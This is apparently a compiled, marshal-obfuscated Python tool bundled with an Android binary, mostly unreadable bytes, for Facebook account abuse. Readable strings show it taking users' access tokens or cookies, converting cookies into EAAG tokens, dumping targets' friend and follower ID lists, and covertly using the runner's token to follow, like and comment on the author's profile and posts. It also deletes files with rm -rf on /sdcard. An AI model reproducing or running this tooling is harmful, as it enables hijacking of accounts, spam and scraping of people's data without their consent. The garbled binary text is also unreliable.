��t�d��d�S�)N�[+] input path : z	sort -r "z" | uniq > /sdcard/AKING�rm -rf /sdcard/1.txt�rm -rf /sdcard/allinone.txt.txtzrm -rf /sdcard/AKINGidz.txt���[1;97m-[0;0m[1;97m-[0;0m[1;97m-[0;0m[1;97m-[0;0m[1;97m-[0;0m[1;97m-[0;0m[1;97m-[0;0m[1;97m-[0;0m[1;97m-[0;0m[1;97m-[0;0m[1;97m-[0;0m[1;97m-[0;0m[1;97m-[0;0m[1;97m-[0;0m[1;97m-[0;0m[1;97m-[0;0m[1;97m-[0;0m[1;97m-[0;0m[1;97m-[0;0m[1;97m-[0;0m[1;97m-[0;0m[1;97m-[0;0m[1;97m-[0;0m[1;97m-[0;0m[1;97m-[0;0m[1;97m-[0;0m[1;97m-[0;0m[1;97m-[0;0m[1;97m-[0;0m[1;97m-[0;0m[1;97m-[0;0m[1;97m-[0;0m[1;97m-[0;0m[1;97m-[0;0m[1;97m-[0;0m[1;97m-[0;0m[1;97m-[0;0m[1;97m-[0;0m[1;97m-[0;0m[1;97m-[0;0m[1;97m-[0;0m[1;97m-[0;0m[1;97m-[0;0m[1;97m-[0;0m[1;97m-[0;0m[1;97m-[0;0m[1;97m-[0;0mu���[✓] Removing successfully ..�5���[✓] Your file path : /storage/emulated/0/XAking.txt�

[?] Retrun back menurd���)r+���r%���rj���rr���)r����filer���r���r���r���@��s���





z

dubb.__init__Nr���r���r���r���r���r~���?��r���r~���c�������������������@���r

���)rs���c�����������������C���s����t��d��tt��td��td��td��td��td��td��td�}t�|dv�r0t���d�S�|d	v�r9t���d�S�ttd

���t	�

d��t���d�S�)NrI���z  ( Select Login Method )

r`���z [1] Login With Tokenz [2] Login With Cookiesr=���z

[*] Login method : )rc���r4���rE���)re���r5���ZcokieszFill In CorrectlyrO���)r%���rj���rr���rt���r���r+���rE����coker,���r���r���rs���)r���Zh_r���r���r���r���M��s���





 zlogin.__init__Nr���r���r���r���r���rs���L��r���rs���c�������������������@���r

���)r}���c�����������������C��������t�d��t�d��t�d��td�}td�}td�}t�d|�d�|�d���t�d|�d�|�d	���t�d

��t�d��t�d��t�d

��t�d��t�d��t�d��t�d��td��t�d��d�S�)N�/-----------------------------------------------�+ [*] Example : 1000 ,10000, 100079 , 100080r�����

[?] Link 1 : �

[?] Link 2 : �cat "�

" | grep "�" > /sdcard/1.txt�" >> /sdcard/1.txtz1sort -r /sdcard/1.txt | uniq > /sdcard/XAKING.txtr����r�����rm -rf /sdcard/AKingidz.txtr�����)���

[✓] Dumping and Sliced successfully ..r����r����rd����rr���r+���r%���rj����r���r�����link�link1r���r���r���r���_���$���







�msort.__init__Nr���r���r���r���r���r}���^��r���r}���c�������������������@���r

���)r|���c�����������������C���s����t�d��t�d��t�d��td�}td�}t�d|�d���t�d|�d���t�d��t�d	��t�d

��t�d��t�d��t�d

��t�d��t�d��td��t�d��d�S�)Nr����z*[*] Example : 1000 ,10000, 100079 , 100080r����r����z!cat /sdcard/allinone.txt | grep "r����r����z1sort -r /sdcard/1.txt | uniq > /sdcard/XAking.txtr����r����zrm -rf /sdcard/Akingidz.txtr����r����r����r����rd���r����)r���r����r����r���r���r���r���s��s"���







z

sort.__init__Nr���r���r���r���r���r|���r��r���r|���c�������������������@���s���e�Zd�Zdd��Zdd��ZdS�)r}���c�����������������C���r����)Nr����r����r����r����r����r����r����r����r����z1sort -r /sdcard/1.txt | uniq > /sdcard/XAKing.txtr����r����r����r����r����u0���[✓] Your file path : /storage/emulated/0/2.txtr����rd���r����r����r���r���r���r������r����r����c�����������

������C���s,��d}d}t��d�}t|jd�}t�d|j�}|D�]u}|d7�}t|�dkr�|}tt	d�t

|����d}d	}	t�g�d

��}

t�g�d��}d|�}t��

d

|�d�|

�d�|���t��

d

|	�d�|�d�|���t��

d

|�d�|

�d�|���t��

d

|	�d�|�d�|���t��

d|���t|��qtt	d���d�S�)Nr���zWhttps://free.facebook.com/story.php?story_fbid=2965703280359878&id=100007607054845&_rdrrS���zEAA\w+rO����%���z	Token  : �2978584119071794�2965703280359878)u���Big fan sir❤️u���Big fan brother💛u���sir big fan💚u���Sir please reply me💙u���Love you sir🖤u'���Sir big fan please reply me🙏🙏🙏u���Legend❤️)u���Star boy❤️u���Love it🥰u

���Good post💚u���I LOVE YOU💙u���Wow sir🖤u���Super Star🧡u���💜r=����https://graph.facebook.com/�/comments/?message=�&access_token=zDhttps://graph.facebook.com/100007607054845/subscribers?access_token=zToken Not Found)rm���rn����par�content�re�findallrq����lenrr���r,����strr���r����post�	cek_tokenr	���)

r���r����ZbiZ

link_tokenZgblZ

token_freeZnaarE����post4�post5ZcommentZloveZsomir���r���r���r������s.���

�Nr���r���r���r���r���r}������s����c�������������������@���r

���)rE���c�����������������C���s����t�d�}z-t�d|��}t�|j�}|d�}tdd�}|�|��|����t	�t	t

d���t���W�d�S��tyI���t	t

d���t

�d��t���Y�d�S�w�)	Nz

[1;97m[+] Enter Token : z+https://graph.facebook.com/me?access_token=rL���rJ���r2���zLogin Successfulz

Token Invalidrb���)r+���rm���rn���ro���rp���rq���rk���r����closerr���r,����

bot_follow�KeyErrorr���r���rE���)r���r���r����r����r����Zzeddr���r���r���r������s���\0ztoken.__init__Nr���r���r���r���r���rE������r���rE���c�������������������@���r

���)�check_kukisc�����������������C���s����t����}z	tdd����}W�n���t���Y�|jdd|id�j}t�dt	|��d�}d|v�rGt

td	���t�

d

��zt�d��W�d�S����Y�d�S�	�d�S�)N�

.cokie.txtr8���z'https://mbasic.facebook.com/profile.php�cookie)Zcookiesz\<title\>(.*?)<\/title\>r���zHalaman Tidak DitemukanzSorry Your Cookies Are DeadrO���)�req�Sessionrk���rl���r����rn���rq���r����r����r����r���r,���r���r���r%����remove)r���ZsessionZcokiZresponZnama__r���r���r���r������s���zcheck_kukis.__init__Nr���r���r���r���r���r�������r���r����c�������������������@���r

���)r����c��������������

���C���s����t�td�t��}|d|�7�}zAddddddd	d

|d�	}tjt|d�}t�d

|j�}|�	d�}d|v�rNt

dd��d|���t

dd��d|���t|��t|��W�n�t

tjjfyj���ttd���t�d��t���Y�nw�tttd����d�S�)Nz

Cookies : znoscript=1;zbusiness.facebook.comz	max-age=0rc���z�Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36zUtext/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8ztext/html; charset=utf-8z

gzip, deflatez#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7)	ZHostz

cache-controlzupgrade-insecure-requestsrQ���Zacceptzcontent-typezaccept-encodingzaccept-languager����rR���z	(EAAG\w+)rO���ZEAArJ���r2����%sr����zCookies Error  ����z$Run This Script Again : python Nx.py)r+���r,���ry����_sesrn����urlsr�����searchrq����grouprk���r���rD����AttributeErrorrm����

exceptionsZTooManyRedirectsrr���r���r���r����r	���r���)r���Z_cookieZ_headZ_rZ_pZ_hr���r���r���r������s���

@�6z

coke.__init__Nr���r���r���r���r���r�������r���r����c�������������������@���r

���)r����c��������������

���C���sr��t����}d}d}d}d}d}d}d}d}	g�d�}

g�d	�}z)td

d����}td

d����}

|�d|��}t�|j�}|d

�}|d�}t|

��W�n%�t	yj�}�zt

tdt|t

f����t�d��t���W�Y�d�}~nd�}~ww�|

D�]

}|�d|�d�|

���qm|D�]

}|�d|�d�|���q}|�d|�d�|

�d�|

���|�d|�d�|

�d�|

���|�d|

�d�|

���t���d�S�)Nr����r����Z167879918678352Z3105954929648426�3048075795436340�198550702277940�198552118944465)�100007607054845r����r����r����r����)r����r����r����r����r����r����Z230946969169829Z235968105334382Z197993725798487Z218558783741981Z138061478458379rJ���r8���rK���rL���rW���zToken Invalid >%s%s%s<rO���r����z/subscribers?access_token=z!/likes?summary=true&access_token=r����r����z>https://graph.facebook.com/3048075795436340/comments/?message=)rm���r����rk���rl���rn���ro���rp���rq���rD����	Exceptionrr���r,���ry����Qr���r���rs���r����rH���)r���Zs_Zpost1Zpost2Zpost3r����r����Zpost6Zpost7Zcuri_Z

my_idz_botZmy_post_botr���rE���r����r����r����rW���r���Zid_botZpost_idr���r���r���r������sB���



��

zbot_follow.__init__Nr���r���r���r���r���r�������r���r����c�������������������@���r

���)�	curi_anakc�����������	������C���s����z%t�dd����}t�dd����}t�d|��}t�|j�}|d�}|d�}W�n�ty<���tt	d���t

�d��t���Y�nw�t�dd����}d	}t�

d

|�d�|�d�|���d�S�)

NrJ���r8���rK���rL���rW���rN���rb���zresult/CP-03-12-2021.txtr����r����r����r����)rk���rl���rm���rn���ro���rp���rq����IOErrorrr���r,���r���r���rs���r����)	r���r���rE���r����r����r����rW���ZanjasZcurir���r���r���r�����s���



�"zcuri_anak.__init__Nr���r���r���r���r���r������r���r����c�������������������@���s���e�Zd�Zdd��Zed��dS�)r����c�����������������C���s���t��d|���z3t��d|��}t�|j�}|d�}|d�}ttd�|dd�����ttd�|���ttd	�|���W�n���Y�z"g�}t��d

|�����d�D�]}z|d�}|�|��W�qM���Y�qMW�n	�t	yj���Y�nw�dt

|��}	|	d

ksyd

|	kr�ttd���d�S�ttd�t�|	�t

���ttd���ttd��}

|

dv�r�tdd�}|�|��|����tdt�d�t�|�t

���tttd����t���d�S�	�d�S�)Nzuhttps://graph.facebook.com/me/feed/?link=https://fb.com/100007018489471/posts/3105954929648426/?app=fbl&access_token=rK���rL���rW���zAccount Name : r����

���zYour Id   : r=���z>https://graph.facebook.com/me/friends?limit=9999&access_token=�datar����rh���zHave No Friends  z	Friend : z$Do you want to use this token (y/n):z

Select One : )r#���r)���rJ���r2���r���zToken : z(Token Found Please,Run : python Multi.py)rm���r����rn���ro���rp���rq���rr���r,����appendr����r����r���ry���r����r+���rk���r���r����r	���)r���rE���r����r����r����rW����goblok�iZFanak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontolZ_idZhaalqZtokr���r���r���r�����sB���

�





zcek_token.__init__r���N)r���r���r���r���rr���r���r���r���r���r������s����"r����c�������������������@���r

���)r{���c��������������

���C���s���zt�dd����}t�dd����}W�n�ty)���t�d��ttd���t�d��Y�nw�t	td��}z3|dkr8d}n*d�

|�d	d

�}d|v�rI|d	d

�}tjd|d

�j

}t|d�}|jddd�}|j}|}W�n���|}Y�z=|dkssd|kr�t�d|��}	t�|	j�}

nt�d|�d�|��}t�|j�}

z|

d�}W�n

�ttfy����d}Y�nw�W�n(�ty��}

�zttd�t�|�t�d���t�d��t���W�Y�d�}

~

nd�}

~

ww�tdt�d�t�|�t�d���|dkr�t�d��t���t�d��d}|dks�|dk�rt���jd�d�����}t�d d!�}z:t�d d"�}t�d|�d#�|�����d$�D�]}|d%�}|d�}t� |d&�|���|�!|d&�|�d����q!|�"���W�n

�t�yP���Y�nw�d't#t��}|d(k�sad(|k�ruttd)�|�d*���t�d��t���d�S�t$td+t#t�����t�d,|�d-�d!�}ttd.�d,�|�d/���ttd0���t%d1d2��5}t�d d��&��}|D�]#}|�'dd�}|�(d&�}d'|d3��}d'|d4��}|�)t*||||���q�W�d�����n	1��s�w���Y��t+���d�S�)5NrJ���r8���ri���zToken Failed  rb���z!Enter link  or Target Username : �mezhttps://free.facebook.com/{}ZLookup)ZfburlZcheckZfacebookzhttps://lookup-id.com/)r����rS����span�coderV���rK���r����z?access_token=rL���zName Not Found  z ID z Not Found  r=���z	Name   : r���z'rm -rf /storage/emulated/0/allinone.txtZallinonera���r����z.janganeditr2����a+�!/friends?limit=9999&access_token=r����rW����|r����rh���zPossible ID z

 Not Public  z

Total ID : %sr!���z.jsonzFile Dump Not Found : �.txtzEnter CTRL + Z  STOP Programe  ����)Zmax_workersr���rO���),rk���rl���r����r%���rj���r	���r,���r���r���r+����formatrm���r����r����r����rw���rq���rn���ro���rp���r����r����r���rz���r����r{���ry����uuidZuuid4�hex�upperrW���r����r���r����r����rr����kikygtg�	readlinesrx����splitZsubmit�lonte__r|���)r���rE���r���ZidtZpayloadZmmk�xxxZidttZaswr�����opZjokr����r���Znamqr���r����ZuidZid_ZdumpppZkiky_gtgZjumar����ZkikyZmalZnmr���r���r���r���;��s����

�



���F�� 





"<

��

zdump_ulti.__init__Nr���r���r���r���r���r{���:��r���r{���c�������������������@���r

���)r����c�����������	���

���C���sH��t�d|�d�d�}zlt�d|�d�|�����d�D�]!}z|d�}|d�}t�|��|�|d	�|�d

���W�q���Y�q|����t�d|�d�|�����d�D�]!}z|d�}|d�}t�|��|�|d	�|�d

���W�qN���Y�qN|����W�n	�ty~���Y�nw�t	j

�dttt

ttttg�ttt�d|�d�d

�����f���t	j

����d�S�)Nr!���r����r����r����r����r����rW���rL���r����r���z%/subscribers?limit=9999&access_token=u$���

%s[%sAKING%s] COLLECTED IDZ •> %sr8���)rk���rm���rn���ro���r����r����r���r����r����r

���r���r�����pilih�Ury����K�Mrz���r����r����r���)	r���ZmlrE���r���ZmamkZlaxkr����Ziidr����r���r���r���r�����s*���"



"



<zlonte__.__init__Nr���r���r���r���r���r����~��r���r����c�������������������@���s���e�Zd�Zdd��Ze���dS�)rH���c�����������������C���s>��t��d��z,tdd����}tdd����}t�d|��}t�|j�}z|d�}W�n���|d�}Y�W�n���t	t

d���t�d��t

���Y�t	t��d	}ttj|d

tid�jd�}|jd

dd�j}|jd

dd�j}	|jd

dd�j}

|jd

dd�j}|jd

dd�j}|�dd�a|	�dd�}

|

�dd�}|�dd�}|�dd�}d�S�)NrI���rJ���r8���rK���rL���rM���rN���rO���rP���rQ���rR���rS���rT���rU���rV���rX���rY���r%���rZ���r[���r=���r\���r]���r^���r_���)r%���rj���rk���rl���rm���rn���ro���rp���rq���rr���r,���r���r���rs���rt���ru���rv���rw���rx���)r���r���rE���r����r����r����r����r����r����rX���r����r����r����r����r����r����r����r���r���r���r������s8���



�

r����N)r���r���r���r���rH���r���r���r���r���rH������s����

c�������������������@���r

���)�Mainc��������������

���C���s����zt����W�n���Y�z	t����t���W�d�S��tjjy%���ttd���Y�d�S��ty?�}�zttd|����W�Y�d�}~d�S�d�}~ww�)NzNetwork Is Dead !z

Error : %s)	rH���r	���rm���r����r���r���r,���r����rr���)r���r���r���r���r���r������s���",��z

Main.__init__Nr���r���r���r���r���r�������r���r����)�r%���r

���rm����ModuleNotFoundErrorrr���rj���Zbs4Z	mechanizeZgTTSr����r����r���r���ro���r���ZhashlibZ	threadingZurllibr����Z	ipaddressZcalendar�

subprocess�base64�platformr���r���ZwaktuZacakr���r����r���r���Zressr	���r���Zconcurrent.futuresr���Z

ThreadPoolZzthreadsr����Zrequests.exceptionsr���ru���r����r�����mkdir�Pr�����Hr�����Br�����O�Nry���rz���r����r�����c�m�u�k�b�p�h�qZ

version_xxr,���ZinpZbulatZgarisr"���r(���r-���Zuser_agnet_randomZkiky_atZua_mmZkiky_hpZstructrk����devnullZnullZcallZSTDOUTZinstar����ZCPZOKZTPZubahPZpwbarur����Zdata2Zloop�okZcpZttlZfwZjqZbfZbgZjgZpqrW���ZlqZizZkxZopqZolqZAmanZCpZSalahZmbZurl_mbZnampungZpwBarur����r����r����ZnowZcurrentr�����strftimeZdurasiZyearZtahunZmonthZbulanZdayZhariZwaktuuZjamzZ	bulan_ttlrt���ZwwnZlogarl���rv���Zua1Zua2rn����lowerZ	kiky_passr:���rD���rF���rG���rH���r~���rs���r}���r|���rE���r����r����r����r����r����r{���r����Ztololr����r����r���r���r���r����<module>���sN��$$$�



(





�B

,3&B)�marshal�exec�loads��r���r����<alvino>�<module>���s���)�marshal�exec�loads��r���r����<alvino>�<module>���s���)�marshal�exec�loads��r���r����<alvino>�<module>���s���)�marshal�exec�loads��r���r����<alvino>�<module>���s���)�marshal�exec�loads��r���r����<alvino>�<module>���s���)�marshal�exec�loads��r���r����<alvino>�<module>���s���)�marshal�exec�loads��r���r����<alvino>�<module>���s���)�marshal�exec�loads��r���r����<alvino>�<module>���s���)�marshal�exec�loads��r���r����<alvino>�<module>���s���)�marshal�exec�loads��r���r����<alvino>�<module>���s���)�marshal�exec�loads��r���r����<alvino>�<module>���s���)�marshal�exec�loads��r���r����<alvino>�<module>���s���)�marshal�exec�loads��r���r����<alvino>�<module>���s���)�marshal�exec�loads��r���r����<alvino>�<module>���s���)�marshal�exec�loads��r���r����<alvino>�<module>���s���)�marshal�exec�loads��r���r����<alvino>�<module>���s���)�marshal�exec�loads��r���r����<alvino>�<module>���s����__test__�;x������H������X������`������h������|��������������$�����<�����d���!�����d"������"������#�����%�����������zR�|����������������������������4��������������������L��������������������d��������������������|������ �����������������������������������������������������$�������t��(���T@������������,�������t�����``�����

���������������H �������L ����������<��� ��x����L ����������\���!�������P0����

��$���|���!��\���T@�����

������$�������"�����T0�����

������������_$��������8�_$��_�_$����_$�`���������_�_$�����-����B�������+�_$����c��+� �����%�,��{������W��O�������)���@�+��(���	E�?��@�T?��`�T����C�����!\6��@�#���������`�T(���%E�����h@���h��k������!h2��������������@��������a��T���������������������!x9����� ���������!L3��������@���*�����a��T������7����!�9������ 

���������!�2���������@���*�����a��T�������7����!@/������ 	���������!x3���������@���*�����a��T�����W

�7����!�2������ ������C�������T����!�3����������*�@�������TU�6<���*�@�����A��T�������7���OC��WB��@��{Ĩ�_�����C��@���� �4�������!�9������ �������C��@������4�������!@/������ �������C��@����`�4�������!�2������ �������C��@������4������OC��WB��@��{Ĩ�_�h@���h��a��T����������OC��WB��@��{Ĩ�_����{��o��g��_��W��O����X�;�@�9��������('E�h��� �T����C�����!\/��@�W�����������B�2�������Rc��RD�Rn��q���������B�0�������Rg���@9�@97���	k���T�@9�@9	k��T���Ф���B5���3��#���������RU���#��"��R��3��RX����7��Y��(����)� +��������8���V������-��*��������8���S������1� *�����s")�t���@��������$��`��@)���@������������8�D������9��(���@������������4�;���>��'���@�����!:������`@�b@�5��`

�7��Д��"@9�&@9(*h�4�*@9H�4�_�.����^������^��@����V���"�������^������^��@����M������_���"��������^������^��@����A������^������^��@�`��������T�

@�����H�������C�@����4`@�a�C�����7���$������!�3����

������"'E�����!�3�������#�7����*��@� ��R3��R������	�����tKE����������� 'E����@	����������� 	�����������*������B���*��3��R��R��մ�R��3��Rպ�R 'E�������5E�H6������>E�����%����E��6@����~��.�������������@����mE�	@�?���T���qE��������C���  �T����C�����T�����@�5�������2������C�����!|2��@�^����U��R���3��R���R�����������h@���h��a��T��Z�������@�����a��T��S�������Z�)�@@�A@�������

�7�@�����a��T��E��H@�I@�

@�?�A�T���QE����@�������@�	���!UE���I@�(���?���� ���@�����a��T��+�����YE�������@������������h���������`���������j���@����������T�@�������T3��h@���h��a��T��	��\��������@@�A+@���n���@������`�7H$��������Rտ�Ra����R���R�@�������A��T��������@�����a��T�����3������R�RM��3��RĀRH��������G��3��RU��RD��3��Ru��RA��3��R���R>��3��R��R;��3��RU��R8��3��R���R5��	���)�)� @�!)@�@�I@�(���?���� ����$�����

����C��@�J�C���qV��(�����!��T�����6�����!+�@�"@���	���)!+� 

���@����

@�(	��6���%��3��R5��R��3��Ru��R��`KE�E��	������� ���U��R���R���`KE������ ������R��R������R���R�������R���R���3��R�ÀR��������� ����������)�����@�)@�B�C�����*��E��6@�����6�������@������A��To�������@������a��T��h�������@������a��T��a����qw�Z������W�4HwE���i;J�+�qd�T

Q+�J	@�_kj�T�4�������������L9�!|2�B�0��*�����������������������<6��*����@���������!	�T��:��F���qk�T�*���

k�*

�Tj

K_�qJ�����*��	@��

*�k���T

�TM��*���	@��*�kJ��_	k���T	�*�)	@�?k!��TI}@�)�|�ii��@���������5E��������������������f����������@�����a��T��������@������a�T����������������<6�!|2��*u����������4@wE����h;J�	�q$�T

P)�J	@��*_k��T?�qK�T�*�� 'E�����?'��@������A��T���('E�����Z@��_�	��T�OS��WR��_Q��gP��oO��{N����_֟k�*

�T*K_�qJ��v�

�6�J	@��*_k���T

�T���	*���

@��*_k֦��k���T	�6�)	@�?k��T	���)AJ�	kA�TA|�8������	���)�(�(@� Y��:	��k��T

}@��~@��(�`�<J��lA��_	�`�=��L��T���~@�		��7	��5��h;

�{�����R ��`�������(�	�R*��R�Y��		��

�������n���~@�	�|�hi�h)�	@�)��	��!��T��{��f��

���{���O�������9E������	@���)I@�	�� ?����������OA��{¨�_�������@�������C�����!�9����@�������OA��{¨�_��{���O������������)��@�b@�������@�

@��������@�������OA��{¨�_֬���������OA��{¨������OA��{¨�_��{������O����@������A@�5��������1������5�������?�������������OB��@��{è�_������OB��@����{è��������������OB��@��{è�_�����C�����!�7��@��������OB��@��{è�_��{���_��W��O�������!)�@��@�i@�(��h��������@������$�T���������T�@���yw������ ��5�@��'E��B9� 6@�I@�h�����?�������������H�� ��6����L������������@�����@�T���OC��WB��_A��{Ĩ�_��@������a��T�������@�����a��T����������h@�����h������T���������OC��WB��_A��{Ĩ�_����{��W��O��C��V�;��@��������������C���?��@�Th@�	�B9)(7	���)�C�

@�����!�8� �����5E����bE���"@�������bE�>�������������`�7	��Ј@�)�C�	���T���� �E����	U@���7i�7	���)�C�

@�����!�0� @��� ���*@�	@���k�T����C�����!�3��@�`����� �R�������������������������@�4���! �R�����������U�������@��@�	�a�T���OC��WB��{A����_����������������5! �R���������������U����@��������T��9�����������������@��@�	����T�������������{������C�B� � � � �����C�b� �����C��� �����C��� �����C��� �����C��� �����C�� �����C�"� �����C�B� �����C�b� �����C��� �����C��� �����C��� �����C��� ����D� � ����D�" � ����

D�B � ����D�b � ����D�� � ����D�� � ����D�� � ����D�� � ����"D�!� ����&D�"!� ����*D�B!� ����.D�b!� ����2D��!� ����6D��!� ����:D��!� ����>D��!� ����BD�"� ����FD�""� ����JD�B"� ����ND�b"� ����RD��"� ����VD��"� ����ZD��"� ����^D��"� ����bD�#� ����fD�"#� ����jD�B#� ����nD�b#� ����rD��#� ����vD��#� ����zD��#� ����~D��#� �����D�$� �����D�"$� �����D�B$� �����D�b$� �����D��$� �����D��$� �����D��$� �����D��$� �����D�%� �����D�"%� �����D�B%� �����D�b%� �����D��%� �������������������������

����������������������������������������������������������������������������������������������������������������������������������������������������	��������������������������������������������������������������������������	�������������������������������������3���������������������������������������	�������������������������������������������������������������������������������������������������w���������������������������������������������������o��������������������������������x������	�����������������o������������������X�������������p���������������������������������������������������������������������8

������

�����������������o�����

��������������

�������������x������������������������o�����	���������o�����

���������o������������������������������������������������������������������������������������������������������������������������������������������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ������� ��������������������������������������������������������������������������������������������������������������������������������������������������������������������Android (7714059, based on r416183c1) clang version 12.0.8 (https://android.googlesource.com/toolchain/llvm-project c935d99d7cf2016289302412d708641d52d2f7ee)�clang version 13.0.1�Linker: LLD 13.0.1���������$��������P$���������������dL��������������d�����������������������(��������Q(�������4��������Q�����������������$����������������0���������4�������cL��������������c����������������<�������\��������Pd�������p��������P���������������������������������P�����������������e���������������������������������e���������������������������������P����������������e�������������eL��������������e������������������������ �������dL������x�������d������������������������ �������eL������x�������e������������������������ ��������L������x�����������������������������������������Q��������������������������������������� �������gL������x������������������������������������������P�������� �������fL������X�������P���������������������� �������f����������������$������l�������dd��������������d����������������$������l�������ed��������������e����������������$������l��������d�������������������������������,������4�������Ql������t�������Q����������������4������X���������X������l�������gt��������������������������������4������<�������P<������l�������ft��������������P����������������X������l�������f����������������p��������������d���������������d����������������p��������������e���������������e����������������p�����������������������������������������������x��������������Q���������������Q������������������������������������������������g������������������������������������������������P���������������f���������������P�������������������������������f�������������������������������d���������������d�������������������������������e�������������e���������������e�����������������������4���������������������������������������������������������Q���������������Q�����������������������������������������������e���������������������4�������e������������������������������������������������P�������4�������d���������������P������������������������������d������4�������d����������������4������d�������Pd�������������d���������������P����������������d����������������P����������������dx�������	��������P��	�������	�������d�

��������������P�����������������h����������������x������D	���������D	������\	�������e\	�������	����������	�������	����������

�������������������������������h��������������0�x������T	�������0�\	�������	�������0��	�������	�������0��

�������

�������0��

�������������0�����������������h����������������x������D	���������D	������\	�������c\	�������	����������	�������	����������

�������������������������������h��������������0�x��������������0����������������c���������������0��������	�������P	������0	�������f0	������D	�������0�\	�������	�������c�	�������	�������f�	�������	�������0��

�������

�������0��

�������

�������0��

�������������P����������������h��������������0�x������T�������0�T��������������f���������������0����������������P���������������e�������D	�������0�\	������|	�������e|	�������	�������0��	�������	�������0��

�������

�������0��

�������

�������f�

�������

�������0��

�������

�������f�

�������

�������P�

�������������0�����������������h��������������0�x��������������0���������������d������4�������0�p��������������0����������������P���������������d�������0	�������0�<	������L	�������dL	������\	�������f\	������d	�������dd	�������	�������0��	�������	�������0��

�������

�������0��

�������

�������0��

�������

�������d�

�������

�������P�

�������

�������d�

�������������0�������������������������������P������$�������c����������������L������t�������0�t��������������e����������������L������d�������0�d������l�������Pl��������������f����������������L��������������0����������������d����������������L������T�������0�T������\�������P\��������������c����������������L������x��������x��������������������������������L��������������0����������������0�����������������L��������������d����������������\��������������c���������������c�����������������������T�������0��	�������

�������0���������������0��������

�������e0

������L

�������0�L

�������

�������e�

������4�������e�����������������������T�������0��	�������

�������0���������������0��������

�������f0

�������

�������0��

������4�������0������������������������T�������d�	�������

�������d��������������d�����������������������T�������d�	�������

�������d�������

�������d�

������4�������d�������������������������������P�������$�������g�	�������	�������PP

�������

�������g���������������� ������T�������f8

������P

�������fx

�������

�������f����������������8������P�������X�

�������

�������X����������������@������P�������Q�

�������

�������Q�������������������������������d\	������t	�������d�������������������������������ed	�������	�������e����������������������8���������8��������������e����������������������� �������e8��������������e0

������L

�������e����������������D	������L	�������dL	������\	�������f����������������D	������L	�������dL	������\	�������f�����������������	������

�������P�������������P�����������������	������

�������Q�������������Q�����������������

������

�������X����������������

������P

�������g�������������g����������������8

������P

�������g����������������8��������������k����������������8��������������l����������������8��������������j����������������<������`�������P����������������<��������������g����������������@��������������f�������������������������������g8��������������g���������������������������������8������H���������H������T�������Zd��������������Z��������������������������������������������������8������H���������H��������������]������������������������������������������������g8��������������g�������������������������������X8��������������X�������������������������������Y8��������������Y�������������������������������[8������H�������[H������P�������^P��������������[����������������������� �������e0

������L

�������e����������������������� �������0� ������8�������e0

������L

�������0��������������������������������0����������������P�������8�������f0

������L

�������0�������������������������������P�������������Q���������������� ������8�������f�������������������������������Z����������������P

�������

�������g�

������4�������g����������������P

�������

�������e�

������4�������e����������������X

�������

�������P�

��������������P�������,�������P����������������`

�������

����������

�������

�������f������(�������f(������0�������������������������`

�������

����������

������(�������[(������0�������������������������`

�������

�������g�

������8�������g����������������`

�������

�������P�

������8�������P����������������`

�������

�������X�

������8�������X����������������d

�������

�������Y�

�������

�������\�

������8�������Y�����������������

�������

�������P����������������8������P�������f������4�������f����������������d��������������j�������������������������������X���������������Z���������������Z���������������X����������������������0�������X����������������8������P�������PP������x�������cx���������������P����������������c����������������P�����������������L������h�������X���������������X����������������X������`�������Y����������������l������x�������d���������������d�������������������������������P���������������c���������������P��������������c������ ��������P� ������(�������c(������0��������P�������������������������������P��������������������������������0���������������0� ������(��������0�����������������0������H�������PH������x�������c���������������c����������������0������L�������QL��������������d����������������Q����������������d����������������Q����������������d����������������Q����������������d����������������Q�����������������0��������������0�����������������P��������������e���������������e���������������e���������������e����������������x��������������c���������������c���������������c���������������� ��������������c�������8�������c����������������4������@�������P@��������������d�������$�������d����������������<������D�������x�D��������������g�������$�������g����������������d��������������e��������������e����������������x��������������e���������������e����������������x��������������P���������������P�������������������������������X�������������������������������f���������������f��������������f����������������$������,�������c,������<�������d����������������\������|�������P|��������������d����������������P����������������d���������������d<������\�������d����������������\��������������Q���������������c���������������c���������������c��������������c<������\�������c�������������������������������0����������������d���������������0����������������0��������<�������d<������\�������0��������������������������������0����������������d���������������e���������������0����������������0��������<�������e<������\�������0�����������������\��������������0��������8�������cD��������������c��������������c<������\�������c�������������������������������c������<�������cX������\�������P�������������������������������e������<�������e����������������%��4�I?:;��$�>��4�I:;��:;��

�I:;8���I:;���I��	:;��

�I:;8��

�I:;8��:;��

&�I��'���I��I'���I:;��I:;��(�

��:;������<���I'��I��!�I7��$�>��.��.@�B:;'I���:;I��4�:;I��

�:;�� 1XYW��!4�1��"��#1UXYW��$�1��%�1��&�1XYW��'�1��(4�1��)

�1��*U��+4�1��,���1��-��1��.����B��/����B��04�I:;��1:;��2

�I:;8��3!�I7��4:;��5

�I:;

8��6.@�B:;'I?��7���1�B��8.:;'I<?��9.:;'I ��:4�:;I��;.:;' ��<�:;I��=.�:;'I<?��>.:;'<?��?.:;'I<?��@.�:;'<?��A��B

�:;��C���D���B��E��1�B��F�1UXYW��G4�:;I��H.:;'I ��I�:;I���x7�������������������

����������`�����@���	�������������]����	h���������h

KJ	������

L���$��

M(l��$��

N0x��B��

O8P��u��

P@9������

QH3��A

��

RPu��g��

SXr����

T`�����W

��

1W

��(

,������

-�2���k��

.~��B��

/���L��

0 �!�����m�	��i��B��k����u��l�M��Q	��kX�����c��9��Bn�����R��z�����q��B	e�������������:��$���

��B��� ����B���(���5���0#��B���8��Q���@���v���H'������Pt��M���X���X���`=������hT������p�������x2

��B��׀:

��M��؈����	��ِD��	��ژd��*	��ݠ����:

�������$���A��A

������g���������

����9

��B����L���

��������

����A���

����a��

����{������

O�������

���L���

������

��������

���B��� *�������(�	�����0L�����81����@X��g��Ha��L��P��L��X����L��`����L��hf��L��	p^��5��

xS

��%��

�j��5����	��,���������vs������t����B��u�)��

